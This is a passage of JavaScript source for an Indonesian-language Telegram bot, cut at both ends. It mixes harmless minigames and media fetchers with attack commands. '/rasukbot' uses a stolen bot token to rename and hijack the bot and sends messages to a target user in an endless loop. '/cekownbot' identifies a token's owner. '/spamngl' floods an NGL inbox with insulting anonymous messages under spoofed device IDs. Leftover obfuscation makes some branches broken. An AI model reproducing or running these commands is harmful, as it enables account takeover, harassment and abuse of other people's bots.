    chatId = Number(ctx.match[2]),
    pendingInfo = botRuntime.pendingGroups?.["get"](chatId);
  try {
    await ctx.deleteMessage();
  } catch {}
  if (action === "allow") {
    botRuntime.pendingGroups?.["delete"](chatId);
    await ctx.reply("✅ Bot diizinkan");
    try {
      await ctx.telegram.sendMessage(chatId, "✅ Bot diizinkan oleh owner");
    } catch {}
  }
  if (action === "deny") {
    botRuntime.pendingGroups?.["delete"](chatId);
    await ctx.reply("❌ Bot ditolak");
    try {
      await ctx.telegram.sendMessage(chatId, "❌ Bot ditolak oleh owner");
      if (pendingInfo?.["userId"]) await ctx.telegram.banChatMember(chatId, pendingInfo.userId).catch(() => {});
      await ctx.telegram.leaveChat(chatId);
    } catch {}
  }
});
bot.command("ssiphone", async ctx => {
  const input = ctx.message.text.split(" ").slice(1).join(" ");
  if (!input) return ctx.reply("❌ Format: /ssiphone 18:00|40|Indosat|can5y", {
    parse_mode: "Markdown"
  });
  let [time, battery, carrier, ...messageParts] = input.split("|");
  if (!time || !battery || !carrier || messageParts.length === 0) return ctx.reply("❌ Format: /ssiphone 18:00|40|Indosat|hai hai`", {
    parse_mode: "Markdown"
  });
  await ctx.reply("⏳ Wait a moment...");
  let encodedMessage = encodeURIComponent(messageParts.join("|").trim());
  let apiUrl = "https://brat.siputzx.my.id/iphone-quoted?time=" + encodeURIComponent(time) + "&batteryPercentage=" + battery + "&carrierName=" + encodeURIComponent(carrier) + "&messageText=" + encodedMessage + "&emojiStyle=apple";
  try {
    const response = await fetch(apiUrl);
    if (!response.ok) return ctx.reply("❌ Gagal mengambil data dari API.");
    const buffer = await response.arrayBuffer(),
      photoBuffer = Buffer.from(buffer),
      photoOpts = {};
    photoOpts.source = photoBuffer;
    const captionOpts = {};
    captionOpts.caption = "✅ Ss Iphone By Bang GXION";
    captionOpts.parse_mode = "Markdown";
    await ctx.replyWithPhoto(photoOpts, captionOpts);
  } catch (err) {
    ctx.reply("Terjadi kesalahan saat menghubungi API.");
  }
});
bot.command("cekownbot", premiumOnly, async ctx => {
  const chatId = ctx.chat.id,
    rawToken = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!rawToken) return ctx.reply("Gunakan: /cekownbot BOT_TOKEN\n\nContoh:\n/cekownbot 123456:ABCDEF");
  const token = rawToken.trim();
  try {
    const statusMessage = await ctx.reply("Mencari pemilik bot..."),
      botInfoResponse = await axios.get("https://api.telegram.org/bot" + token + "/getMe");
    if (!botInfoResponse.data.ok) return ctx.reply("Token invalid!");
    const botUsername = botInfoResponse.data.result.username,
      botFirstName = botInfoResponse.data.result.first_name,
      updateParams = {};
    updateParams.limit = 100;
    updateParams.allowed_updates = ["message"];
    const updateOpts = {};
    updateOpts.params = updateParams;
    const updatesResponse = await axios.get("https://api.telegram.org/bot" + token + "/getUpdates", updateOpts);
    let ownerId = null,
      ownerUsername = null,
      ownerFullName = null;
    if (updatesResponse.data.result.length > 0)
      for (const update of updatesResponse.data.result) {
        if (update.message && update.message.from) {
          const sender = update.message.from;
          if (!sender.is_bot) {
            ownerId = sender.id;
            ownerUsername = sender.username || "Tidak ada username";
            ownerFullName = ((sender.first_name || "") + " " + (sender.last_name || "")).trim() || "Tidak ada nama";
            break;
          }
        }
      }
    if (!ownerId) {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, undefined, "Tidak ada riwayat chat ditemukan.\n\nCara dapatkan ID pemilik:\n1. Kirim /start ke bot @" + botUsername + "\n2. Jalankan ulang /cekownbot " + token + "\n\nAtau cek manual di @BotFather\n/mybots > pilih bot > API Token\n\nInfo bot:\nNama: " + botFirstName + "\nUsername: @" + botUsername + "\nToken: " + token);
      return;
    }
    await ctx.telegram.editMessageText(chatId, statusMessage.message_id, undefined, "----------------------------------------\n     PEMILIK TOKEN BOT DITEMUKAN\n----------------------------------------\n\nPemilik : @" + ownerUsername + "\nNama Lengkap : " + ownerFullName + "\nID Pemilik : " + ownerId + "\nToken Bot : " + token + "\nUsername Bot : @" + botUsername + "\nNama Bot : " + botFirstName + "\n\n----------------------------------------\nDitemukan oleh System\n----------------------------------------");
  } catch (err) {
    await ctx.reply("Error: " + err.message);
  }
});
bot.command("rasukbot", premiumOnly, async ctx => {
  const helper = {};
  helper.waPrefix = "chat.whatsapp.com/";
  helper.scanLabel = "🔍 Scanninh token bot dan database api telegram...";
  helper.invalidToken = "Token invalid!";
  helper.userLabel = "User";
  helper.startCmd = "start";
  helper.startDesc = "Mulai";
  helper.helpCmd = "help";
  helper.helpDesc = "Bantuan";
  helper.ampasText = "BOT LU AMPAS!";
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.modulo = function (a, b) {
    return a % b;
  };
  helper.equals2 = function (a, b) {
    return a === b;
  };
  helper.tagA = "hMbzH";
  helper.equals3 = function (a, b) {
    return a === b;
  };
  helper.tagB = "RtVxh";
  helper.tagC = "ggQDq";
  const H = helper;
  const chatId = ctx.chat.id;
  const input = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!input || !input.includes("|")) return ctx.reply("Gunakan: /rasukbot TOKEN_BOT|ID_USER\n\nContoh:\n/rasukbot 123456:ABCDEF|678901234");
  const [botToken, targetId] = input.split("|").map(part => part.trim());
  if (!botToken || !targetId || isNaN(targetId)) return ctx.reply("Format salah! Token|ID");
  try {
    const statusMessage = await ctx.reply(H.scanLabel),
      botInfoResponse = await axios.get("https://api.telegram.org/bot" + botToken + "/getMe");
    if (!botInfoResponse.data.ok) return ctx.reply(H.invalidToken);
    const botUsername = botInfoResponse.data.result.username,
      botFirstName = botInfoResponse.data.result.first_name;
    let targetName = H.userLabel;
    try {
      const targetChat = await ctx.telegram.getChat(targetId);
      targetName = targetChat.first_name || H.userLabel;
    } catch {}
    const joinLink = "t.me/durov",
      nameParams = {};
    nameParams.name = "MargaLuAMPASngentoddd";
    await axios.post("https://api.telegram.org/bot" + botToken + "/setMyName", nameParams);
    const descParams = {};
    descParams.description = "Bot ini telah diambil alih!\nRasuk By: " + targetName + " (" + targetId + ")\nJoin: " + joinLink;
    await axios.post("https://api.telegram.org/bot" + botToken + "/setMyDescription", descParams);
    const startCommand = {};
    startCommand.command = H.startCmd;
    startCommand.description = H.startDesc;
    const helpCommand = {};
    helpCommand.command = H.helpCmd;
    helpCommand.description = H.helpDesc;
    const commandsParams = {};
    commandsParams.commands = [startCommand, helpCommand];
    await axios.post("https://api.telegram.org/bot" + botToken + "/setMyCommands", commandsParams);
    await axios.post("https://api.telegram.org/bot" + botToken + "/deleteWebhook");
    await ctx.telegram.editMessageText(chatId, statusMessage.message_id, undefined, "✅ BOT @" + botUsername + " SUKSES DIRASUK!\nTarget: " + targetName + "\n\n📨 Spam executed...");
    let spamCount = 0;
    const spamMessages = ["BOT INI SUDAH DIRASUK!", "Owner: " + targetName, "Join: " + joinLink, H.ampasText];
    while (true) {
      try {
        const chosenText = spamMessages[Math.floor(H.multiply(Math.random(), spamMessages.length))],
          sendParams = {};
        sendParams.chat_id = targetId;
        sendParams.text = chosenText + "\n\n🔗 JOIN: " + joinLink;
        sendParams.reply_markup = {};
        sendParams.reply_markup.inline_keyboard = [
          [{
            text: "📢 JOIN",
            url: "https://" + joinLink
          }]
        ];
        await axios.post("https://api.telegram.org/bot" + botToken + "/sendMessage", sendParams);
        spamCount++;
        H.equals(H.modulo(spamCount, 10), 0) && (await ctx.telegram.editMessageText(chatId, statusMessage.message_id, undefined, "✅ BOT @" + botUsername + " SUKSES DIRASUK!\nTarget: " + targetName + "\n📨 Spam: " + spamCount + "/∞"));
        await new Promise(resolve => setTimeout(resolve, 100));
      } catch (err) {
        if (H.equals2(err.response?.["status"], 429)) {
          const retryAfter = err.response.data.parameters?.["retry_after"] || 5;
          await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
        } else {
          if (H.equals2(err.response?.["status"], 403)) {
            if (H.equals2("llrfD", H.tagA)) {
              if (progressMessage.killed) return;
              try {
                console.log(chalk.yellow("  ⚠  Periodic validation skipped: " + err.message));
              } catch {}
            } else {
              await ctx.telegram.editMessageText(chatId, statusMessage.message_id, undefined, "⚠️ Bot di-block target!\nTotal spam: " + spamCount);
              break;
            }
          } else await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
    }
  } catch (err) {
    if (H.equals3(H.tagB, H.tagC)) {
      const inviteCode = input.split(H.waPrefix)[1].split(/[?&\s]/)[0];
      targetId2 = inviteCode;
    } else await ctx.reply("Error: " + err.message);
  }
});
bot.command("time", async ctx => {
  const now = new Date(),
    timeZoneWib = {};
  timeZoneWib.timeZone = "Asia/Jakarta";
  const dateWib = new Date(now.toLocaleString("en-US", timeZoneWib)),
    dateWita = new Date(now.toLocaleString("en-US", {
      timeZone: "Asia/Makassar"
    })),
    timeZoneWit = {};
  timeZoneWit.timeZone = "Asia/Jayapura";
  const dateWit = new Date(now.toLocaleString("en-US", timeZoneWit));
  const timeOpts = {};
  timeOpts.hour = "2-digit";
  timeOpts.minute = "2-digit";
  timeOpts.second = "2-digit";
  timeOpts.hour12 = false;
  const formatTime = date => date.toLocaleTimeString("id-ID", timeOpts),
    dateOpts = {};
  dateOpts.weekday = "long";
  dateOpts.day = "numeric";
  dateOpts.month = "long";
  dateOpts.year = "numeric";
  const formatDate = date => date.toLocaleDateString("id-ID", dateOpts),
    message = "<blockquote>\n🕐 WAKTU SEKARANG 🕐\n\n┌─────────────────┐\n│ 🟢 WIB \n│    " + formatTime(dateWib) + "\n│    " + formatDate(dateWib) + "\n├─────────────────┤\n│ 🟡 WITA\n│    " + formatTime(dateWita) + "\n│    " + formatDate(dateWita) + "\n├─────────────────┤\n│ 🔵 WIT\n│    " + formatTime(dateWit) + "\n│    " + formatDate(dateWit) + "\n└─────────────────┘\n\n✨ Ketikan /start untuk kembali menu utama ✨\n</blockquote>",
    opts = {};
  opts.parse_mode = "HTML";
  await ctx.reply(message, opts);
});
bot.command("cekidch", async ctx => {
  const helper = {};
  helper.missingUsername = "Masukkan username channel.\nContoh: /cekidch @namachannel";
  const H = helper;
  const channelUsername = ctx.message.text.split(" ")[1];
  if (!channelUsername) return ctx.reply(H.missingUsername);
  try {
    const chatInfo = await ctx.telegram.getChat(channelUsername);
    ctx.reply("📢 ID Channel:\n" + chatInfo.id);
  } catch {
    ctx.reply("Channel tidak ditemukan atau bot belum menjadi admin.");
  }
});
const tebakAngkaState = {},
  triviaState = {},
  typingState = {},
  mathState = {},
  tebakKataState = {},
  reactionState = {};
const triviaCity = {};
triviaCity.q = "Ibukota Indonesia?";
triviaCity.a = "jakarta";
const triviaMath = {};
triviaMath.q = "5 + 5 × 2 = ?";
triviaMath.a = "15";
const triviaAnimal = {};
triviaAnimal.q = "Hewan tercepat di darat?";
triviaAnimal.a = "cheetah";
const triviaPlanet = {};
triviaPlanet.q = "Planet terbesar di tata surya?";
triviaPlanet.a = "jupiter";
const triviaRainbow = {};
triviaRainbow.q = "Warna pelangi ada berapa?";
triviaRainbow.a = "7";
const triviaLamp = {};
triviaLamp.q = "Siapa penemu lampu?";
triviaLamp.a = "thomas edison";
const triviaSquare = {};
triviaSquare.q = "10² = ?";
triviaSquare.a = "100";
const triviaIndependence = {};
triviaIndependence.q = "Bulan berapa Indonesia merdeka?";
triviaIndependence.a = "8";
const triviaFreeze = {};
triviaFreeze.q = "Air membeku di suhu? (celsius)";
triviaFreeze.a = "0";
const triviaTriangle = {};
triviaTriangle.q = "Jumlah sisi segitiga?";
triviaTriangle.a = "3";
const triviaBank = [triviaCity, triviaMath, triviaAnimal, triviaPlanet, triviaRainbow, triviaLamp, triviaSquare, triviaIndependence, triviaFreeze, triviaTriangle],
  tebakKataBank = ["javascript", "telegram", "whatsapp", "indonesia", "programming", "developer", "bot", "coding", "server", "github"];
bot.command("tebakangka", async ctx => {
  const helper = {};
  helper.add = function (a, b) {
    return a + b;
  };
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.introText = "🎯 *TEBAK ANGKA*\n\nAku punya angka 1-100\nKamu punya 5 nyawa\n\nKetik angkanya aja!";
  helper.markdown = "Markdown";
  const H = helper,
    userId = ctx.from.id,
    secretNumber = H.add(Math.floor(H.multiply(Math.random(), 100)), 1);
  tebakAngkaState[userId] = {
    angka: secretNumber,
    nyawa: 5,
    start: Date.now()
  };
  await ctx.reply(H.introText, {
    parse_mode: H.markdown
  });
});
bot.command("trivia", async ctx => {
  const helper = {};
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.markdown = "Markdown";
  const H = helper;
  const userId = ctx.from.id,
    pickedQuestion = triviaBank[Math.floor(H.multiply(Math.random(), triviaBank.length))];
  triviaState[userId] = {
    jawaban: pickedQuestion.a,
    start: Date.now(),
    total: 0
  };
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("🧠 *TRIVIA CEPAT*\n\n📝 " + pickedQuestion.q + "\n\n⏱ Jawab secepat mungkin!", opts);
});
bot.command("slot", async ctx => {
  const helper = {};
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.jackpotText = "🎉 JACKPOT!";
  helper.equals2 = function (a, b) {
    return a === b;
  };
  helper.equals3 = function (a, b) {
    return a === b;
  };
  helper.tryAgain = "😔 Coba lagi";
  helper.markdown = "Markdown";
  const H = helper;
  const slotSymbols = ["🍒", "🍋", "🔔", "⭐", "7️⃣", "💎"],
    reel1 = slotSymbols[Math.floor(H.multiply(Math.random(), slotSymbols.length))];
  const reel2 = slotSymbols[Math.floor(H.multiply(Math.random(), slotSymbols.length))];
  const reel3 = slotSymbols[Math.floor(Math.random() * slotSymbols.length)];
  let outcome = "";
  if (reel1 === reel2 && H.equals(reel2, reel3)) outcome = H.jackpotText;
  else {
    if (H.equals2(reel1, reel2) || H.equals3(reel2, reel3) || H.equals2(reel1, reel3)) outcome = "👏 Hampir!";
    else outcome = H.tryAgain;
  }
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("🎰 *SLOT MACHINE*\n\n┌───────────┐\n│ " + reel1 + "  " + reel2 + "  " + reel3 + " │\n└───────────┘\n\n" + outcome, opts);
});
bot.command("dadu", async ctx => {
  const helper = {};
  helper.add = function (a, b) {
    return a + b;
  };
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.markdown = "Markdown";
  const H = helper,
    roll = H.add(Math.floor(H.multiply(Math.random(), 6)), 1),
    diceEmoji = ["", "⚀", "⚁", "⚂", "⚃", "⚄", "⚅"];
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("🎲 *LEMPAR DADU*\n\n" + diceEmoji[roll] + "  Angka: " + roll, opts);
});
bot.command("suit", async ctx => {
  const helper = {};
  helper.helpText = "✊✋✌️ *SUIT!*\n\nPilih:\n/batu\n/kertas\n/gunting";
  helper.markdown = "Markdown";
  const H = helper;
  await ctx.reply(H.helpText, {
    parse_mode: H.markdown
  });
});
bot.command(["batu", "kertas", "gunting"], async ctx => {
  const helper = {};
  helper.rockLabel = "✊ Batu";
  helper.paperLabel = "✋ Kertas";
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.drawText = "🤝 SERI!";
  helper.equals2 = function (a, b) {
    return a === b;
  };
  helper.equals3 = function (a, b) {
    return a === b;
  };
  helper.equals4 = function (a, b) {
    return a === b;
  };
  helper.markdown = "Markdown";
  const H = helper,
    choiceMap = {};
  choiceMap.batu = 0;
  choiceMap.kertas = 1;
  choiceMap.gunting = 2;
  const choices = choiceMap;
  const labels = [H.rockLabel, H.paperLabel, "✌️ Gunting"],
    playerChoice = choices[ctx.message.text.replace("/", "")],
    botChoice = Math.floor(H.multiply(Math.random(), 3));
  let result = "";
  if (H.equals(playerChoice, botChoice)) result = H.drawText;
  else {
    if (H.equals2(playerChoice, 0) && H.equals3(botChoice, 2) || H.equals2(playerChoice, 1) && H.equals3(botChoice, 0) || H.equals4(playerChoice, 2) && botChoice === 1) result = "🎉 KAMU MENANG!";
    else result = "😔 KAMU KALAH!";
  }
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("✊✋✌️ *SUIT!*\n\nKamu: " + labels[playerChoice] + "\nBot: " + labels[botChoice] + "\n\n" + result, opts);
});
bot.command("typing", async ctx => {
  const helper = {};
  helper.fast = "cepat";
  helper.slow = "lambat";
  helper.cat = "kucing";
  helper.eat = "makan";
  helper.sleep = "tidur";
  helper.run = "lari";
  helper.fly = "terbang";
  helper.quiet = "diam";
  helper.talk = "bicara";
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.markdown = "Markdown";
  const H = helper,
    userId = ctx.from.id;
  const words = [H.fast, H.slow, H.cat, H.eat, H.sleep, H.run, H.fly, "renang", H.quiet, H.talk];
  const pickedWord = words[Math.floor(H.multiply(Math.random(), words.length))];
  typingState[userId] = {
    kata: pickedWord,
    start: Date.now()
  };
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("⌨️ *TYPING SPEED*\n\nKetik kata ini secepat mungkin:\n\n*`" + pickedWord + "`*", opts);
});
bot.command("math", async ctx => {
  const helper = {};
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.multiply2 = function (a, b) {
    return a * b;
  };
  helper.add = function (a, b) {
    return a + b;
  };
  helper.multiply3 = function (a, b) {
    return a * b;
  };
  helper.multiply4 = function (a, b) {
    return a * b;
  };
  helper.multiply5 = function (a, b) {
    return a * b;
  };
  helper.markdown = "Markdown";
  const H = helper;
  const userId = ctx.from.id,
    operators = ["+", "-", "×"];
  const pickedOperator = operators[Math.floor(H.multiply(Math.random(), operators.length))];
  let leftOperand, rightOperand, answer;
  switch (pickedOperator) {
    case "+":
      leftOperand = Math.floor(Math.random() * 100);
      rightOperand = Math.floor(H.multiply2(Math.random(), 100));
      answer = H.add(leftOperand, rightOperand);
      break;
    case "-":
      leftOperand = Math.floor(H.multiply3(Math.random(), 100));
      rightOperand = Math.floor(H.multiply4(Math.random(), leftOperand));
      answer = leftOperand - rightOperand;
      break;
    case "×":
      leftOperand = H.add(Math.floor(H.multiply5(Math.random(), 20)), 1);
      rightOperand = H.add(Math.floor(H.multiply5(Math.random(), 10)), 1);
      answer = H.multiply5(leftOperand, rightOperand);
      break;
  }
  mathState[userId] = {
    jawaban: answer,
    start: Date.now(),
    soal: leftOperand + " " + pickedOperator + " " + rightOperand
  };
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("🔢 *MATH RACE*\n\n" + leftOperand + " " + pickedOperator + " " + rightOperand + " = ?\n\nJawab dengan angka!", opts);
});
bot.command("tebakkata", async ctx => {
  const helper = {};
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.markdown = "Markdown";
  const H = helper,
    userId = ctx.from.id,
    pickedWord = tebakKataBank[Math.floor(H.multiply(Math.random(), tebakKataBank.length))];
  const masked = "_ ".repeat(pickedWord.length).trim(),
    state = {};
  state.kata = pickedWord;
  state.tebakan = [];
  state.nyawa = 5;
  tebakKataState[userId] = state;
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("📝 *TEBAK KATA*\n\n`" + masked + "`\n\n❤️ Nyawa: 5\nKetik hurufnya!", opts);
});
bot.command("koin", async ctx => {
  const helper = {};
  helper.lessThan = function (a, b) {
    return a < b;
  };
  helper.heads = "🪙 KEPALA";
  helper.tails = "🪙 EKOR";
  helper.markdown = "Markdown";
  const H = helper,
    coinResult = H.lessThan(Math.random(), 0.5) ? H.heads : H.tails;
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("🪙 *FLIP COIN*\n\n...mengocok...\n\n" + coinResult, opts);
});
bot.command("reaction", async ctx => {
  const userId = ctx.from.id;
  const delay = Math.floor(Math.random() * 3000) + 1000;
  const opts = {};
  opts.parse_mode = "Markdown";
  await ctx.reply("⚡ *REACTION SPEED*\n\nTunggu sinyal...", opts);
  setTimeout(async () => {
    reactionState[userId] = Date.now();
    const signalOpts = {};
    signalOpts.parse_mode = "Markdown";
    await ctx.reply("🔴 *SEKARANG!*\n\nBalas pesan ini secepat mungkin!", signalOpts);
  }, delay);
});
bot.on("text", async (ctx, next) => {
  const userId = ctx.from.id;
  const text = ctx.message.text;
  if (tebakAngkaState[userId]) {
    const state = tebakAngkaState[userId],
      guess = parseInt(text);
    if (!isNaN(guess)) {
      state.nyawa--;
      if (guess === state.angka) {
        const elapsed = ((Date.now() - state.start) / 1000).toFixed(1);
        delete tebakAngkaState[userId];
        const opts = {};
        opts.parse_mode = "Markdown";
        return ctx.reply("🎉 *BENAR!*\n\nAngka: " + state.angka + "\nWaktu: " + elapsed + " detik\nSisa nyawa: " + state.nyawa, opts);
      }
      if (state.nyawa <= 0) {
        delete tebakAngkaState[userId];
        const opts = {};
        opts.parse_mode = "Markdown";
        return ctx.reply("💀 *GAME OVER*\n\nAngkanya: " + state.angka, opts);
      }
      const hint = guess < state.angka ? "⬆️ Lebih besar" : "⬇️ Lebih kecil";
      return ctx.reply(hint + "\n❤️ Nyawa: " + state.nyawa);
    }
  }
  if (triviaState[userId]) {
    const state = triviaState[userId],
      answer = text.toLowerCase().trim();
    state.total++;
    if (answer === state.jawaban) {
      const elapsed = ((Date.now() - state.start) / 1000).toFixed(1),
        score = Math.max(0, 100 - Math.floor(elapsed * 10));
      delete triviaState[userId];
      const opts = {};
      opts.parse_mode = "Markdown";
      return ctx.reply("✅ *BENAR!*\n\n⏱ " + elapsed + " detik\n⭐ Score: +" + score, opts);
    }
    if (state.total >= 3) {
      delete triviaState[userId];
      const opts = {};
      opts.parse_mode = "Markdown";
      return ctx.reply("❌ *SALAH*\n\nJawaban: " + state.jawaban, opts);
    }
    return ctx.reply("❌ Salah! Coba lagi (" + (3 - state.total) + "x kesempatan)");
  }
  if (typingState[userId]) {
    const state = typingState[userId];
    if (text.toLowerCase() === state.kata) {
      const elapsed = ((Date.now() - state.start) / 1000).toFixed(2),
        wpm = (state.kata.length / elapsed * 12).toFixed(0);
      delete typingState[userId];
      const opts = {};
      opts.parse_mode = "Markdown";
      return ctx.reply("⚡ *TEPAT!*\n\n⏱ " + elapsed + " detik\n⌨️ " + wpm + " WPM", opts);
    }
  }
  if (mathState[userId]) {
    const state = mathState[userId],
      answer = parseInt(text);
    if (!isNaN(answer)) {
      if (answer === state.jawaban) {
        const elapsed = ((Date.now() - state.start) / 1000).toFixed(1);
        delete mathState[userId];
        const opts = {};
        opts.parse_mode = "Markdown";
        return ctx.reply("🎯 *BENAR!*\n\n" + state.soal + " = " + state.jawaban + "\n⏱ " + elapsed + " detik", opts);
      }
      return ctx.reply("❌ Salah! Coba lagi");
    }
  }
  if (tebakKataState[userId]) {
    const state = tebakKataState[userId],
      letter = text.toLowerCase();
    if (letter.length === 1) {
      if (state.tebakan.includes(letter)) return ctx.reply("⚠️ Huruf sudah ditebak!");
      state.tebakan.push(letter);
      if (!state.kata.includes(letter)) {
        state.nyawa--;
        if (state.nyawa <= 0) {
          delete tebakKataState[userId];
          const opts = {};
          opts.parse_mode = "Markdown";
          return ctx.reply("💀 *GAME OVER*\n\nKatanya: " + state.kata, opts);
        }
      }
      const masked = state.kata.split("").map(char => state.tebakan.includes(char) ? char : "_").join(" ");
      if (!masked.includes("_")) {
        delete tebakKataState[userId];
        const opts = {};
        opts.parse_mode = "Markdown";
        return ctx.reply("🎉 *MENANG!*\n\nKatanya: " + state.kata, opts);
      }
      const opts = {};
      opts.parse_mode = "Markdown";
      return ctx.reply("`" + masked + "`\n❤️ " + state.nyawa, opts);
    }
  }
  if (reactionState[userId]) {
    const elapsed = ((Date.now() - reactionState[userId]) / 1000).toFixed(3);
    delete reactionState[userId];
    let rank = "";
    if (elapsed < 0.3) rank = "🔥 GODLIKE!";
    else {
      if (elapsed < 0.5) rank = "⚡ SANGAT CEPAT!";
      else {
        if (elapsed < 1) rank = "👍 CEPAT!";
        else {
          if (elapsed < 2) rank = "🙂 BIASA AJA";
          else rank = "🐌 LELET!";
        }
      }
    }
    return ctx.reply("⏱ " + elapsed + " detik\n" + rank);
  }
  return next();
});
bot.command("brat", async ctx => {
  const input = ctx.message.text.split(" ").slice(1).join(" ");
  if (!input) return ctx.reply("❌ Masukkan teks!");
  try {
    const apiUrl = "https://api.zenzxz.my.id/maker/brat?text=" + encodeURIComponent(input),
      opts = {};
    opts.responseType = "arraybuffer";
    const response = await axios.get(apiUrl, opts);
    await ctx.replyWithSticker({
      source: Buffer.from(response.data)
    });
  } catch (err) {
    ctx.reply("❌ API error / tidak tersedia.");
  }
});
bot.command("spamngl", async ctx => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 1) return ctx.reply("🪧 ☇ Format: /spamngl rainonesday 10");
    const username = args[0],
      count = parseInt(args[1], 10),
      delayMs = 200;
    if (isNaN(count) || count < 1) return ctx.reply("❌ ☇ Masukan jumlah dan harus berupa angka");
    await ctx.reply("⏳ ☇ Mengirim " + count + " pesan spam ke " + username);
    for (let index = 1; index <= count; index++) {
      try {
        const deviceId = crypto.randomBytes(21).toString("hex"),
          question = "WOI DONGO KENAL VINA GA??",
          bodyData = "username=" + username + "&question=" + encodeURIComponent(question) + "&deviceId=" + deviceId;
        await fetch("https://ngl.link/api/submit", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
          },
          body: bodyData
        });
      } catch {}
      index < count && (await new Promise(resolve => setTimeout(resolve, index % 50 === 0 ? delayMs + 200 : delayMs)));
    }
    ctx.reply("✅ ☇ Selesai mengirim " + count + " pesan spam ke " + username);
  } catch (err) {
    ctx.reply("❌ ☇ Gagal menghubungi api, oba lagi nanti");
  }
});
bot.command("snack", async ctx => {
  const link = ctx.message.text.split(" ")[1];
  if (!link) return ctx.reply("Contoh:\n/snack https://s.snackvideo.com/xxxx");
  if (!link.includes("snackvideo")) return ctx.reply("❌ Itu bukan link SnackVideo, jangan ngawur");
  try {
    await ctx.reply("⏳ Lagi diproses... sabar dikit napa");
    const requestOpts = {};
    requestOpts.timeout = 15000;
    const response = await axios.get("https://api.shecodes.io/snackvideo?url=" + encodeURIComponent(link), requestOpts),
      videoUrl = response?.["data"]?.["data"]?.["video"];
    if (!videoUrl) return ctx.reply("❌ Gagal ambil video, kemungkinan API nya lagi ngambek");
    const videoOpts = {};
    videoOpts.url = videoUrl;
    const captionOpts = {};
    captionOpts.caption = "✅ Beres. Udah, jangan spam lagi";
    await ctx.replyWithVideo(videoOpts, captionOpts);
  } catch (err) {
    ctx.reply("❌ Error. Bisa jadi:\n- API mati\n- Link lu aneh\n- Internet lu kentang");
  }
});
bot.command(/\/gethtml(?:\s+(.+))?/, async (ctx, args) => {
  const helper = {};
  helper.lessThan = function (a, b) {
    return a < b;
  };
  helper.subtract = function (a, b) {
    return a - b;
  };
  helper.invalidUrlMsg = "🔗 *Masukkan domain atau URL yang valid!*\n\nContoh:\n`/gethtml https://example.com`";
  helper.markdown = "Markdown";
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.tag = "mhLic";
  helper.textType = "text";
  helper.filename = "source_code.html";
  helper.contentType = "text/html";
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.tag2 = "vBRCk";
  const H = helper;
  const chatId = ctx.chat.id;
  const url = (args[1] || "").trim();
  if (!url || !/^https?:\/\//i.test(url)) return bot.telegram.sendMessage(chatId, H.invalidUrlMsg, {
    parse_mode: H.markdown
  });
  try {
    if (H.equals(H.tag, H.tag)) {
      await bot.telegram.sendMessage(chatId, "⏳ Mengambil source code dari URL...");
      const requestOpts = {};
      requestOpts.responseType = H.textType;
      requestOpts.timeout = 30000;
      const response = await axios.get(url, requestOpts),
        sourceCode = response.data,
        filePath = path.join(__dirname, "source_code.html");
      fs.writeFileSync(filePath, sourceCode);
      const fileOpts = {};
      fileOpts.filename = H.filename;
      fileOpts.contentType = H.contentType;
      await bot.telegram.sendDocument(chatId, filePath, {}, fileOpts);
      fs.unlinkSync(filePath);
    } else {
      const failResult = {};
      failResult.ok = false;
      failResult.reason = "File terlalu besar (max 5MB)";
      return failResult;
    }
  } catch (err) {
    if (H.notEquals("vBRCk", H.tag2)) {
      a.queue = ctx.queue.filter(item => {
        return H.lessThan(H.subtract(d, item.addedAt), 600000);
      });
    } else {
      const opts = {};
      opts.parse_mode = H.markdown;
      bot.telegram.sendMessage(chatId, "❌ *Terjadi kesalahan:*\n`" + err.message + "`", opts);
    }
  }
});
const {
  exec: execChildProcess
} = require("child_process");
bot.command("check", async ctx => {
  try {
    const repliedMessage = ctx.message.reply_to_message;
    if (!repliedMessage?.["document"]) return ctx.reply("╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n┃      JAVASCRIPT ANALYZER      ┃\n╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n📤 Please reply to a JavaScript file\n\n📌 Example:\n1. Send file.js\n2. Reply file tersebut\n3. Ketik /check\n\n━━━━━━━━━━━━━━━━━━━━━━\n\n⏳ Waiting for file...");
    const document = repliedMessage.document;
    if (!document.file_name.endsWith(".js")) return ctx.reply("❌ Invalid File\n\nOnly JavaScript (.js) files are supported.");
    const statusMessage = await ctx.reply("⌜ JAVASCRIPT ANALYZER ⌟\n╎ File      : " + document.file_name + "\n╎ Status    : Scanning...\n╎ Engine    : Node.js Checker\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n🔍 Analyzing JavaScript file..."),
      fileInfo = await ctx.telegram.getFile(document.file_id),
      fileUrl = "https://api.telegram.org/file/bot" + bot.token + "/" + fileInfo.file_path,
      tempPath = "./check_" + Date.now() + ".js",
      requestOpts = {};
    requestOpts.responseType = "arraybuffer";
    const fileData = await axios.get(fileUrl, requestOpts);
    fs.writeFileSync(tempPath, fileData.data);
